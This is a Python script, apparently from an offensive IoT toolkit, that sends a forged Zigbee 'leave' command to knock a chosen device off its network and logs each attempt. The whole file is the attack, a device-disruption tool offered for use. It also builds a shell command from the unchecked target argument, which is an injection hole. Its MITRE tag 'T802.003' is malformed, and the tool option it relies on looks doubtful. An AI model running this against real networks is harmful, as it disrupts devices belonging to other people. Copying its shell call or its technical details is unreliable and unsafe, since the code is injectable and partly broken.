#!/usr/bin/env python3

import argparse
import subprocess
import json
import os
from datetime import datetime

LOG_FILE = "results/zigbee_fake_leave_log.json"
MITRE_TTP = "T802.003"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def send_fake_leave(dev, ieee_addr):
    cmd = f"zbstumbler -d {dev} -l {ieee_addr}"
    subprocess.run(cmd, shell=True)

def main():
    parser = argparse.ArgumentParser(description="Zigbee Fake Leave Command")
    parser.add_argument("--dev", default="zb0", help="Zigbee interface device")
    parser.add_argument("--target", required=True, help="IEEE Address of device to force leave")
    args = parser.parse_args()

    send_fake_leave(args.dev, args.target)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "interface": args.dev,
        "target": args.target,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
